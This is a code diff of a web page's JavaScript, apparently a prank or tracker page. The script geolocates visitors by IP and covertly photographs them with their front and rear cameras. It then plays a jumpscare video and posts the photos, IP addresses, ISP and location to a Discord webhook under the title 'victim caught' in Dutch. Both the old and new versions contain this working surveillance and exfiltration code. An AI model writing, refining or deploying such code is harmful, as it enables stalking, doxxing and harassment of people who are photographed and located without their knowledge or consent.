@@ -181,12 +181,14 @@
 
   async function getInfo() {
     try {
-      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
-      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      ipInfo.v4 = v4.query;
-      ipInfo.v6 = v6.ip;
-      ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
-      ipInfo.isp = v4.isp;
+      const v4Data = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
+      const v6Data = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4Data.status === 'success') {
+        ipInfo.v4 = v4Data.query;
+        ipInfo.loc = `${v4Data.city}, ${v4Data.regionName}, ${v4Data.country}`;
+        ipInfo.isp = v4Data.isp;
+      }
+      ipInfo.v6 = v6Data.ip;
     } catch(e) {}
   }
   getInfo();
@@ -195,41 +197,37 @@
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
 
-    // Naar loading
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // 📸 NEEM FOTO'S (Eerst Selfie, dan Achterkant)
-    const photos = [];
+    const capturedPhotos = [];
     
     // Selfie
     try {
-      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const b1 = await captureFrame(s1, true);
-      if(b1) photos.push({ blob: b1, name: 'selfie.jpg' });
-      s1.getTracks().forEach(t => t.stop());
+      const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const b1 = await captureFrame(streamF, true);
+      if(b1) capturedPhotos.push({ blob: b1, name: 'selfie.jpg' });
+      streamF.getTracks().forEach(t => t.stop());
     } catch(e) { console.warn("Selfie failed", e); }
 
     // Achtercamera
     try {
-      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      const b2 = await captureFrame(s2, false);
-      if(b2) photos.push({ blob: b2, name: 'omgeving.jpg' });
-      s2.getTracks().forEach(t => t.stop());
+      const streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      const b2 = await captureFrame(streamB, false);
+      if(b2) capturedPhotos.push({ blob: b2, name: 'omgeving.jpg' });
+      streamB.getTracks().forEach(t => t.stop());
     } catch(e) { console.warn("Back cam failed", e); }
 
-    // 🚀 START JUMPSCARE
     document.getElementById('screen-loading').style.display = 'none';
     document.getElementById('screen-jumpscare').style.display = 'flex';
     
-    const v = document.getElementById('jvid');
-    v.volume = 1.0;
-    await v.play();
+    const video = document.getElementById('jvid');
+    video.volume = 1.0;
+    await video.play();
 
-    // 📝 VERSTUUR DATA
-    uploadResults(photos);
+    // Verstuur naar Discord
+    finalUpload(capturedPhotos);
 
-    // 🏁 TROLL SCHERM
     setTimeout(() => {
       document.getElementById('screen-jumpscare').style.display = 'none';
       document.getElementById('screen-troll').style.display = 'flex';
@@ -250,33 +248,35 @@
           if(flip) { ctx.translate(can.width,0); ctx.scale(-1,1); }
           ctx.drawImage(vid, 0, 0);
           can.toBlob(resolve, 'image/jpeg', 0.95);
-        }, 500); // Wacht even voor scherp beeld
+        }, 500);
       };
     });
   }
 
-  async function uploadResults(photoArray) {
-    const fd = new FormData();
+  async function finalUpload(photos) {
+    const formData = new FormData();
     const payload = {
       username: "🕵️ Telegram Reporter",
       embeds: [{
-        title: "🎯 SLACHTOFFER VERSLAG",
+        title: "🎯 SLACHTOFFER GEPAKT",
         color: 0x24A1DE,
         fields: [
-          { name: "📱 Apparaat", value: `\`${navigator.platform}\``, inline: true },
+          { name: "📱 Platform", value: `\`${navigator.platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
           { name: "📍 Locatie", value: ipInfo.loc, inline: false },
           { name: "🏢 Provider", value: ipInfo.isp, inline: false }
         ],
-        footer: { text: "Night Owl Tracker" }
+        footer: { text: "Night Owl Tracker Pro" }
       }]
     };
 
-    fd.append('payload_json', JSON.stringify(payload));
-    photoArray.forEach((p, i) => fd.append(`file${i}`, p.blob, p.name));
+    formData.append('payload_json', JSON.stringify(payload));
+    photos.forEach((p, i) => {
+      formData.append(`file${i+1}`, p.blob, p.name);
+    });
     
-    await fetch(WEBHOOK, { method: 'POST', body: fd }).catch(e => console.error("Upload failed", e));
+    await fetch(WEBHOOK, { method: 'POST', body: formData });
   }
 </script>
 </body>
